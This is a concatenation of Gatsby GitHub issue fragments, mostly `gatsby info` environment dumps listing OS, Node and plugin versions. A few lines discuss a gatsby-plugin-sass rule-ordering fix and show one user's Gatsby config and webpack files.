``` system: os: linux 4.15 ubuntu 18.04.2 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i7-7500u cpu @ 2.70ghz shell: 5.4.2 - /bin/zsh binaries: node: 12.6.0 - ~/.nvm/versions/node/v12.6.0/bin/node yarn: 1.17.3 - ~/.yarn/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v12.6.0/bin/npm languages: python: 2.7.15+ - /usr/bin/python browsers: chrome: 75.0.3770.142 firefox: 68.0.1 npmpackages: gatsby: 2.13.50 => 2.13.50 gatsby-image: 2.2.8 => 2.2.8 gatsby-plugin-atl: ^0.0.1 => 0.0.1 gatsby-plugin-eslint: ^2.0.5 => 2.0.5 gatsby-plugin-manifest: 2.2.4 => 2.2.4 gatsby-plugin-offline: 2.2.4 => 2.2.4 gatsby-plugin-react-helmet: 3.1.3 => 3.1.3 gatsby-plugin-sass: ^2.1.4 => 2.1.4 gatsby-plugin-sharp: 2.2.9 => 2.2.9 gatsby-source-filesystem: 2.1.8 => 2.1.8 gatsby-transformer-sharp: 2.2.5 => 2.2.5 gatsby-transformer-yaml: 2.2.4 => 2.2.4 ``` ## additional it's a simple enough fix
[gatsby-plugin-sass#l30-l35]( #l30-l35) could just be dropped down below `sassrulesmodules`, and an additional step could be added to splice in `resolve-url-loader`, just like it does for `sassrule`
i've implemented the fix locally, and it works well.
system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 10.16.0 - /usr/local/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 76.0.3809.87 firefox: 68.0.1 safari: 12.1.1 npmpackages: gatsby: ^2.0.76 => 2.13.45 gatsby-image: ^2.0.20 => 2.2.7 gatsby-mdx: 0.6.3 => 0.6.3 gatsby-plugin-antd: ^2.0.2 => 2.0.2 gatsby-plugin-compile-es6-packages: ^2.1.0 => 2.1.0 gatsby-plugin-google-analytics: ^2.0.9 => 2.1.6 gatsby-plugin-less: ^2.0.8 => 2.1.2 gatsby-plugin-manifest: ^2.0.9 => 2.2.4 gatsby-plugin-offline: ^2.0.16 => 2.2.4 gatsby-plugin-react-helmet: ^3.0.2 => 3.1.2 gatsby-plugin-react-svg: ^2.1.1 => 2.1.1 gatsby-plugin-sass: (internal url) => 2.0.11 gatsby-plugin-sharp: ^2.0.18 => 2.2.9 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-autolink-headers: ^2.0.14 => 2.1.3 gatsby-remark-copy-linked-files: ^2.0.8 => 2.1.4 gatsby-remark-images: ^3.0.1 => 3.1.7 gatsby-source-filesystem: ^2.0.25 => 2.1.7 gatsby-source-git: ^1.0.1 => 1.0.1 gatsby-source-graphql: ^2.0.8 => 2.1.3 gatsby-transformer-remark: ^2.2.4 => 2.6.10 gatsby-transformer-sharp: ^2.1.8 => 2.2.5 npmglobalpackages: gatsby-cli: 2.7.9
``` system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.142 firefox: 66.0.3 safari: 12.1.1 npmpackages: gatsby: ^2.13.45 => 2.13.45 gatsby-theme-blog: ^1.0.0 => 1.0.0 gatsby-theme-notes: ^1.0.0 => 1.0.0 npmglobalpackages: gatsby-cli: 2.4.8```
``` system: os: windows 10 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz binaries: yarn: 1.17.3 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.17763.1.0 npmpackages: gatsby: ^2.13.45 => 2.13.45 gatsby-plugin-layout: ^1.1.2 => 1.1.2 ```
system: os: windows 10 cpu: (4) x64 intel(r) core(tm) i7-6500u cpu @ 2.50ghz binaries: npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.13.3 => 2.13.3 gatsby-image: ^2.2.4 => 2.2.4 gatsby-plugin-intl: ^0.2.6 => 0.2.6 gatsby-plugin-manifest: ^2.2.1 => 2.2.1 gatsby-plugin-offline: ^2.2.0 => 2.2.0 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.0 gatsby-plugin-sharp: ^2.2.2 => 2.2.2 gatsby-source-filesystem: ^2.1.2 => 2.1.2 gatsby-transformer-sharp: ^2.2.1 => 2.2.1
```sh system: os: linux 5.2 arch linux undefined cpu: (4) x64 intel(r) core(tm) i7-7500u cpu @ 2.70ghz shell: 5.0.7 - /bin/bash binaries: node: 10.15.0 - /tmp/yarn--1564416284644-0.9074305935989049/node yarn: 1.17.3 - /tmp/yarn--1564416284644-0.9074305935989049/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.15.0/bin/npm languages: python: 3.7.3 - /usr/bin/python browsers: firefox: 68.0.1
$ gatsby info --clipboard system: os: linux 4.4 ubuntu 16.04.6 lts (xenial xerus) cpu: (4) x64 intel(r) core(tm) i7-5600u cpu @ 2.60ghz shell: 4.3.48 - /bin/bash binaries: node: 10.16.0 - ~/n/bin/node npm: 6.9.0 - ~/n/bin/npm languages: python: 2.7.12 - /usr/bin/python npmpackages: gatsby: ^2.0.22 => 2.8.6 gatsby-image: ^2.2.1 => 2.2.1 gatsby-plugin-catch-links: ^2.0.4 => 2.0.15 gatsby-plugin-feed: ^2.0.8 => 2.2.3 gatsby-plugin-google-analytics: ^2.0.21 => 2.0.21 gatsby-plugin-google-fonts: latest => 1.0.1 gatsby-plugin-layout: ^1.1.2 => 1.1.2 gatsby-plugin-manifest: ^2.1.1 => 2.1.1 gatsby-plugin-netlify: ^2.0.17 => 2.0.17 gatsby-plugin-offline: ^2.1.1 => 2.1.1 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.12 gatsby-plugin-robots-txt: ^1.4.0 => 1.4.0 gatsby-plugin-sass: ^2.0.1 => 2.0.11 gatsby-plugin-sharp: ^2.0.6 => 2.1.3 gatsby-plugin-sitemap: ^2.1.0 => 2.1.0 gatsby-remark-copy-linked-files: ^2.0.5 => 2.0.13 gatsby-remark-images: ^2.0.4 => 2.0.6 gatsby-remark-prismjs: ^3.2.11 => 3.2.11 gatsby-remark-reading-time: ^1.0.1 => 1.0.1 gatsby-remark-responsive-iframe: ^2.0.5 => 2.1.1 gatsby-remark-smartypants: ^2.0.5 => 2.0.9 gatsby-source-filesystem: ^2.0.3 => 2.0.38 gatsby-transformer-remark: ^2.3.12 => 2.3.12 gatsby-transformer-sharp: ^2.1.3 => 2.1.21 npmglobalpackages: gatsby-cli: 2.6.13
``` **note** that this is a wsl installation on windows 10.0.17134.799.
system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.0.2 - /usr/local/bin/fish binaries: node: 12.3.1 - ~/.asdf/shims/node yarn: 1.16.0 - ~/.asdf/shims/yarn npm: 6.9.0 - ~/.asdf/shims/npm languages: python: 2.7.15 - /users/thanx/.asdf/shims/python browsers: chrome: 75.0.3770.142 safari: 12.1.1 npmpackages: gatsby: ^2.13.39 => 2.13.39 gatsby-image: ^2.2.6 => 2.2.6 gatsby-plugin-manifest: ^2.2.4 => 2.2.4 gatsby-plugin-offline: ^2.2.4 => 2.2.4 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.2 gatsby-plugin-sharp: ^2.2.9 => 2.2.9 gatsby-source-filesystem: ^2.1.6 => 2.1.6 gatsby-transformer-sharp: ^2.2.4 => 2.2.4
``` system: os: macos 10.15 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.6.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 75.0.3770.142 safari: 13.0 npmpackages: gatsby: ^2.9.2 => 2.10.0 gatsby-image: ^2.2.1 => 2.2.1 gatsby-plugin-feed: ^2.3.0 => 2.3.0 gatsby-plugin-google-analytics: ^2.1.0 => 2.1.0 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.0 => 2.2.0 gatsby-plugin-netlify: ^2.1.0 => 2.1.0 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.0 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-robots-txt: ^1.4.0 => 1.4.0 gatsby-plugin-sharp: ^2.2.1 => 2.2.1 gatsby-plugin-sitemap: ^2.2.0 => 2.2.0 gatsby-plugin-styled-components: ^3.1.0 => 3.1.0 gatsby-plugin-typescript: ^2.1.0 => 2.1.0 gatsby-plugin-typography: ^2.3.0 => 2.3.0 gatsby-remark-copy-linked-files: ^2.1.0 => 2.1.0 gatsby-remark-embed-gist: ^1.1.7 => 1.1.7 gatsby-remark-embed-spotify: ^2.0.2 => 2.0.2 gatsby-remark-embed-video: ^1.7.1 => 1.7.1 gatsby-remark-images: ^3.0.14 => 3.1.0 gatsby-remark-prismjs: ^3.3.0 => 3.3.0 gatsby-remark-responsive-iframe: ^2.2.0 => 2.2.0 gatsby-remark-smartypants: ^2.1.0 => 2.1.0 gatsby-source-filesystem: ^2.0.39 => 2.1.0 gatsby-transformer-json: ^2.2.0 => 2.2.0 gatsby-transformer-remark: ^2.3.12 => 2.5.0 gatsby-transformer-sharp: ^2.2.0 => 2.2.0 ```
``` system: os: linux 5.0 ubuntu 19.04 (disco dingo) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 5.0.3 - /bin/bash binaries: node: 10.16.0 - /tmp/yarn--1564036896798-0.009151794373142508/node yarn: 1.17.3 - /tmp/yarn--1564036896798-0.009151794373142508/yarn npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: firefox: 68.0 npmpackages: gatsby: ^2.1.27 => 2.13.32 gatsby-image: ^2.0.31 => 2.2.6 gatsby-plugin-create-client-paths: ^2.0.4 => 2.1.3 gatsby-plugin-env-variables: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.0.22 => 2.2.3 gatsby-plugin-react-helmet: ^3.0.8 => 3.1.2 gatsby-plugin-react-svg: ^2.1.1 => 2.1.1 gatsby-plugin-remote-images: ^1.0.1 => 1.0.3 gatsby-plugin-sass: ^2.0.11 => 2.1.3 gatsby-plugin-sharp: ^2.0.25 => 2.2.8 gatsby-plugin-typescript: ^2.1.0 => 2.1.2 gatsby-source-filesystem: ^2.0.23 => 2.1.5 gatsby-source-s3-image: ^1.5.8 => 1.6.5 gatsby-transformer-sharp: ^2.1.15 => 2.2.4
(if relevant) <!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here.
### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
``` system: os: macos 10.14.5 cpu: (4) x64 intel(r) core(tm) i5-5250u cpu @ 1.60ghz shell: 3.2.57 - /bin/bash binaries: node: 12.6.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 3.7.4 - /users/jeff/bin/python browsers: chrome: 75.0.3770.100 firefox: 62.0 safari: 12.1.1 npmpackages: gatsby: ^2.0.64 => 2.13.32 gatsby-image: ^2.0.26 => 2.2.6 gatsby-link: ^2.0.7 => 2.2.2 gatsby-plugin-google-analytics: ^2.0.9 => 2.1.4 gatsby-plugin-material-ui: ^2.1.4 => 2.1.4 gatsby-plugin-mdx: ^1.0.14 => 1.0.15 gatsby-plugin-react-helmet: ^3.0.4 => 3.1.2 gatsby-plugin-sharp: ^2.0.17 => 2.2.8 gatsby-plugin-typescript: ^2.0.3 => 2.1.2 gatsby-remark-images: ^3.0.1 => 3.1.7 gatsby-remark-katex: ^3.1.2 => 3.1.2 gatsby-source-filesystem: ^2.0.11 => 2.1.5 gatsby-transformer-sharp: ^2.1.10 => 2.2.4 ```
macos mojave (version 10.14.5) on imac (late 2014).
node v12.6.0
npm v6.10.1
``` system: [2/9994] os: macos 10.14.5 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 10.11.0 - /usr/local/bin/node yarn: 1.5.1 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/local/bin/python browsers: chrome: 75.0.3770.142 firefox: 67.0.4 safari: 12.1.1 npmpackages: gatsby: ^2.13.32 => 2.13.32 gatsby-plugin-google-analytics: ^2.0.20 => 2.0.20 gatsby-plugin-modal-routing: ^1.0.0 => 1.0.0 gatsby-plugin-netlify: ^2.0.17 => 2.0.17 gatsby-plugin-postcss: ^2.0.7 => 2.0.7 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-react-svg: ^2.1.1 => 2.1.1 gatsby-plugin-sitemap: ^2.1.0 => 2.1.0 gatsby-plugin-typescript: ^2.0.15 => 2.0.15 gatsby-plugin-typography: ^2.2.13 => 2.2.13 gatsby-source-filesystem: ^2.1.5 => 2.1.5 gatsby-transformer-javascript-frontmatter: ^2.1.2 => 2.1.2 npmglobalpackages: gatsby-cli: 2.6.3 error unhandled rejection error: - index.js:303 function.module.exports.sync [lib]/[gatsby-cli]/[execa]/index.js:303:26 - macos.js:9 object.copysync [lib]/[gatsby-cli]/[clipboardy]/lib/macos.js:9:26 - index.js:38 object.exports.writesync.input [as writesync] [lib]/[gatsby-cli]/[clipboardy]/index.js:38:13 - create-cli.js:224 envinfo.run.then.envinfooutput [lib]/[gatsby-cli]/lib/create-cli.js:224:24 - next_tick.js:68 process._tickcallback internal/process/next_tick.js:68:7 ```
system: os: linux 4.4 ubuntu 16.04.6 lts (xenial xerus) cpu: (3) x64 intel(r) xeon(r) cpu e5-2670 v2 @ 2.50ghz shell: 4.3.48 - /bin/bash binaries: node: 10.15.3 - /opt/nvm/versions/node/v10/bin/node yarn: 1.15.2 - /opt/nvm/versions/node/v10/bin/yarn npm: 6.4.1 - /opt/nvm/versions/node/v10/bin/npm languages: python: 2.7.12 - /usr/bin/python npmpackages: gatsby: ^2.13.31 => 2.13.31
``` system: os: linux 4.15 ubuntu 18.04.2 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i5-6600k cpu @ 3.50ghz shell: 5.4.2 - /bin/zsh binaries: node: 10.16.0 - /usr/bin/node yarn: 1.17.3 - /usr/bin/yarn npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.15+ - /usr/bin/python browsers: firefox: 68.0 npmglobalpackages: gatsby-cli: 2 ```
```bash system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 10.1.0 - ~/.nvm/versions/node/v10.1.0/bin/node yarn: 1.6.0 - ~/.nvm/versions/node/v10.1.0/bin/yarn npm: 6.0.1 - ~/.nvm/versions/node/v10.1.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.142 firefox: 65.0 safari: 12.1.1 npmpackages: gatsby: ^2.0.6 => 2.13.23 gatsby-image: ^2.0.6 => 2.2.6 gatsby-plugin-google-analytics: ^2.0.6 => 2.1.4 gatsby-plugin-layout: ^1.0.13 => 1.1.2 gatsby-plugin-manifest: ^2.0.2 => 2.2.3 gatsby-plugin-mdx: ^1.0.13 => 1.0.13 gatsby-plugin-netlify: ^2.0.16 => 2.1.3 gatsby-plugin-postcss: ^2.0.0 => 2.1.2 gatsby-plugin-prefetch-google-fonts: ^1.4.2 => 1.4.2 gatsby-plugin-react-helmet: ^3.0.0 => 3.1.2 gatsby-plugin-sharp: ^2.0.17 => 2.2.7 gatsby-plugin-sitemap: ^2.0.1 => 2.2.3 gatsby-plugin-styled-components: ^3.0.2 => 3.1.2 gatsby-plugin-typography: ^2.2.0 => 2.3.2 gatsby-plugin-webpack-bundle-analyzer: ^1.0.4 => 1.0.5 gatsby-remark-autolink-headers: ^2.0.16 => 2.1.3 gatsby-remark-check-links: ^1.1.5 => 1.1.5 gatsby-remark-code-repls: ^2.0.7 => 2.2.0 gatsby-remark-copy-linked-files: ^2.0.13 => 2.1.3 gatsby-remark-custom-blocks: ^2.0.6 => 2.1.2 gatsby-remark-embed-snippet: ^3.2.4 => 3.2.4 gatsby-remark-graphviz: ^1.1.2 => 1.1.2 gatsby-remark-images: ^2.0.3 => 2.0.6 gatsby-remark-prettier: ^1.0.0 => 1.0.0 gatsby-remark-prismjs: ^3.1.4 => 3.3.3 gatsby-remark-sectionize: ^1.0.0 => 1.0.0 gatsby-remark-video: ^1.2.1 => 1.2.1 gatsby-source-filesystem: ^2.0.1 => 2.1.5 gatsby-source-graphql: ^2.0.3 => 2.1.2 gatsby-transformer-remark: ^2.3.2 => 2.6.6 gatsby-transformer-sharp: ^2.1.2 => 2.2.3 gatsby-transformer-yaml: ^2.1.1 => 2.2.3 npmglobalpackages: gatsby-cli: 2.6.2
``` system: os: linux 4.18 ubuntu 18.10 (cosmic cuttlefish) cpu: (8) x64 intel(r) core(tm) i7-7700 cpu @ 3.60ghz shell: 4.4.19 - /bin/bash binaries: node: 11.15.0 - /usr/bin/node npm: 6.9.0 - ~/.npmprefix/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 75.0.3770.100 firefox: 68.0 npmpackages: gatsby: ^2.13.25 => 2.13.25 npmglobalpackages: gatsby-cli: 2.7.15
``` ### related issues i have found similar sounding issues but they were refering to the offline plugin and have been closed a long time ago.
``` system: os: macos 10.14.5 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.3.1 - ~/.nvm/versions/node/v12.3.1/bin/node npm: 6.10.1 - ~/.nvm/versions/node/v12.3.1/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.142 safari: 12.1.1 npmpackages: gatsby: ^2.10.5 => 2.10.5 gatsby-image: ^2.2.3 => 2.2.3 gatsby-plugin-algolia: ^0.3.0 => 0.3.0 gatsby-plugin-manifest: ^2.2.0 => 2.2.0 gatsby-plugin-offline: ^2.2.0 => 2.2.0 gatsby-plugin-sass: ^2.1.0 => 2.1.0 gatsby-plugin-sharp: ^2.2.1 => 2.2.1 gatsby-plugin-styled-components: ^3.1.0 => 3.1.0 gatsby-remark-autolink-headers: ^2.1.0 => 2.1.0 gatsby-remark-code-buttons: ^2.0.1 => 2.0.1 gatsby-remark-images: ^3.1.2 => 3.1.2 gatsby-remark-prismjs: ^3.3.0 => 3.3.0 gatsby-source-filesystem: ^2.1.1 => 2.1.1 gatsby-transformer-remark: ^2.5.0 => 2.5.0 gatsby-transformer-sharp: ^2.2.0 => 2.2.0 npmglobalpackages: gatsby-cli: 2.7.0
*note* while the packages don't list gatsby's sharp plugins, it's only because i removed those and added them back in as local plugins so i could experiment/test things out on them, which is how i discovered this bug
system: os: macos 10.14.5 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 12.4.0 - ~/.nvm/versions/node/v12.4.0/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v12.4.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 safari: 12.1.1 npmpackages: gatsby: ^2.10.0 => 2.13.17 gatsby-image: ^2.2.1 => 2.2.6 gatsby-plugin-feed: ^2.3.0 => 2.3.4 gatsby-plugin-manifest: ^2.2.0 => 2.2.3 gatsby-plugin-netlify: ^2.1.0 => 2.1.2 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^2.2.0 => 2.2.3 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.2 gatsby-plugin-sass: ^2.1.0 => 2.1.3 gatsby-source-drupal: ^3.2.5 => 3.2.6 gatsby-source-filesystem: ^2.1.0 => 2.1.5 gatsby-transformer-json: ^2.2.0 => 2.2.2
``` system: os: macos 10.14.5 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 3.5.3 - /users/mike/.pyenv/shims/python browsers: chrome: 75.0.3770.100 firefox: 67.0.4 safari: 12.1.1 npmpackages: gatsby: ^2.13.21 => 2.13.21 gatsby-theme-blog: ^1.0.0 => 1.0.0 npmglobalpackages: gatsby-cli: 2.7.7 gatsby-dev-cli: 2.4.19 gatsby: 2.8.8 ```
system: os: macos 10.14.5 cpu: (4) x64 intel(r) core(tm) i7-6567u cpu @ 3.30ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 12.1.0 - /var/folders/v0/ssn2yzps0wq9j6ngd3128_440000gn/t/yarn--1563185093192-0.21022637200966066/node yarn: 1.16.0 - /var/folders/v0/ssn2yzps0wq9j6ngd3128_440000gn/t/yarn--1563185093192-0.21022637200966066/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 firefox: 67.0.2 safari: 12.1.1 npmpackages: gatsby: ^2.13.21 => 2.13.21 gatsby-image: ^2.2.6 => 2.2.6 gatsby-plugin-manifest: ^2.2.3 => 2.2.3 gatsby-plugin-offline: ^2.2.4 => 2.2.4 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.2 gatsby-plugin-sharp: ^2.2.7 => 2.2.7 gatsby-source-filesystem: ^2.1.5 => 2.1.5 gatsby-transformer-sharp: ^2.2.3 => 2.2.3
i think there's no need here
system: os: macos 10.14.5 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.16.0 - ~/.config/yarn/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 77.0.3833.0 safari: 12.1.1 npmpackages: gatsby: latest => 2.13.20 gatsby-image: latest => 2.2.6 gatsby-plugin-feed: latest => 2.3.4 gatsby-plugin-nprogress: latest => 2.1.2 gatsby-plugin-offline: latest => 2.2.4 gatsby-plugin-react-helmet: latest => 3.1.2 gatsby-plugin-sharp: latest => 2.2.7 gatsby-plugin-sitemap: latest => 2.2.3 gatsby-plugin-typography: latest => 2.3.2 gatsby-remark-autolink-headers: latest => 2.1.3 gatsby-remark-copy-linked-files: latest => 2.1.3 gatsby-remark-images: latest => 3.1.6 gatsby-remark-prismjs: latest => 3.3.3 gatsby-remark-responsive-iframe: latest => 2.2.4 gatsby-remark-smartypants: latest => 2.1.2 gatsby-source-filesystem: latest => 2.1.5 gatsby-transformer-remark: latest => 2.6.5 gatsby-transformer-sharp: latest => 2.2.3 gatsby-transformer-yaml: latest => 2.2.3
system: os: macos 10.14.4 cpu: (8) x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 5.3 - /bin/zsh binaries: node: 11.0.0 - ~/.nvm/versions/node/v11.0.0/bin/node yarn: 1.17.0 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v11.0.0/bin/npm languages: python: 2.7.12 - /usr/local/bin/python browsers: chrome: 75.0.3770.100 firefox: 49.0.1 safari: 12.1 npmpackages: gatsby: ^2.13.12 => 2.13.12 gatsby-background-image: ^0.2.74 => 0.2.74 gatsby-image: ^2.2.4 => 2.2.4 gatsby-plugin-google-gtag: ^1.1.1 => 1.1.1 gatsby-plugin-gtag: ^1.0.11 => 1.0.11 gatsby-plugin-manifest: ^2.2.1 => 2.2.1 gatsby-plugin-offline: ^2.2.1 => 2.2.1 gatsby-plugin-react-helmet: ^3.1.0 => 3.1.0 gatsby-plugin-react-svg: ^2.1.1 => 2.1.1 gatsby-plugin-sass: ^2.1.0 => 2.1.0 gatsby-plugin-sharp: ^2.2.3 => 2.2.3 gatsby-source-filesystem: ^2.1.3 => 2.1.3 gatsby-transformer-remark: ^2.6.1 => 2.6.1 gatsby-transformer-sharp: ^2.2.1 => 2.2.1 gatsby-transformer-yaml: ^2.2.0 => 2.2.0 npmglobalpackages: gatsby-cli: 2.4.17
(if relevant) ``` system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 75.0.3770.100 firefox: 67.0.4 safari: 12.1.1 npmpackages: gatsby: ^2.4.2 => 2.6.0 gatsby-mdx: ^0.6.3 => 0.6.3 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 npmglobalpackages: gatsby-cli: 2.7.9
``` ### file contents (if changed) `gatsby-config.js`: ```module.exports = { sitemetadata: { title: `capital design system`, description: `documentation and guidelines for the opengov design system, capital.`, author: `@opengov` }, plugins: [ `gatsby-plugin-react-helmet`, `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, { resolve: `gatsby-plugin-manifest`, options: { name: `gatsby-starter-default`, short_name: `starter`, start_url: `/`, background_color: `#663399`, theme_color: `#663399`, display: `minimal-ui`, icon: `src/images/favicon.png` // this path is relative to the root of the site
} }, { resolve: `gatsby-plugin-favicon`, options: { logo: "./src/images/favicon.png", } }, // load typescript \'gatsby-plugin-typescript\', // load mdx { resolve: `gatsby-mdx`, options: { extensions: [`.mdx`, `.md`], defaultlayouts: { components: require.resolve(\'./src/components/layouts/layoutcomponents.tsx\'), default: require.resolve(\'./src/components/layouts/layoutdefault.tsx\') } } }, { resolve: `gatsby-source-filesystem`, options: { name: `images`, path: `${__dirname}/src/images` } }, { resolve: `gatsby-source-filesystem`, options: { name: `components`, path: `${__dirname}/src/pages/components/` } }, { resolve: `gatsby-source-filesystem`, options: { name: `design`, path: `${__dirname}/src/pages/design` } } ]
``` `package.json`:
```{ "name": "capital-website", "private": true, "description": "documentation and guidelines for the opengov design system, capital.", "version": "0.1.0", "author": "@opengov", "dependencies": { "@mdx-js/mdx": "^1.0.18", "@mdx-js/react": "^1.0.16", "@mdx-js/tag": "^0.20.3", "@opengov/capital-style": "^4.0.0", "@opengov/component-library": "6.8.6", "gatsby": "^2.4.2", "gatsby-image": "^2.0.41", "gatsby-mdx": "^0.6.3", "gatsby-plugin-favicon": "^3.1.6", "gatsby-plugin-manifest": "^2.1.1", "gatsby-plugin-offline": "^2.1.0", "gatsby-plugin-react-helmet": "^3.0.12", "gatsby-plugin-sass": "^2.0.11", "gatsby-plugin-sharp": "^2.0.36", "gatsby-plugin-typescript": "^2.0.13", "gatsby-source-filesystem": "^2.0.33", "gatsby-transformer-remark": "^2.3.12", "gatsby-transformer-sharp": "^2.1.19", "jsx-to-string": "^1.4.0", "node-sass": "^4.12.0", "prop-types": "^15.7.2", "react": "^16.8.6", "react-dom": "^16.8.6", "react-helmet": "^5.2.1", "react-syntax-highlighter": "^10.2.1" }, "devdependencies": { "prettier": "^1.17.0", "typescript": "^2.9.1" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "build": "gatsby build", "clean": "gatsby clean", "develop": "gatsby develop", "format": "prettier --write src/**/*.{js,jsx}", "start": "npm run develop", "serve": "gatsby serve", "test": "echo \\"write tests! -> "" }, "bugs": { "url": " " }
``` `gatsby-node.js`: ```exports.oncreatewebpackconfig = ({ stage, rules, loaders, plugins, actions }) => { const { setwebpackconfig } = actions; const production = stage !== 'develop'; const isssr = stage.includes('html'); const sassloader = { loader: require.resolve('sass-loader'), options: { sourcemap: !production } }; // const sassrule = { // test: /\\.s(a|c)ss$/, // use: isssr // ? [loaders.null()] // : [ // loaders.minicssextract(), // loaders.css({ ...cssloaderoptions, importloaders: 2 }), // loaders.postcss({ plugins: postcssplugins }), // sassloader // ] // }; const sassrulemodules = { test: /\\.scss$/, use: [ !isssr && loaders.minicssextract({ hmr: false }), loaders.css({ modules: true, importloaders: 2 }), loaders.postcss(), sassloader ].filter(boolean) }; let configrules = []; switch (stage) { case 'develop': case 'build-javascript': case 'build-html': case 'develop-html': configrules = configrules.concat([sassrulemodules]); break; } setwebpackconfig({ module: { rules: configrules } });
``` `gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: windows 10 cpu: (4) x64 intel(r) core(tm) i5-6500 cpu @ 3.20ghz binaries: yarn: 1.16.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.17763.1.0 npmpackages: gatsby: ^2.13.6 => 2.13.6 gatsby-theme-blog: ^1.0.0 => 1.0.0
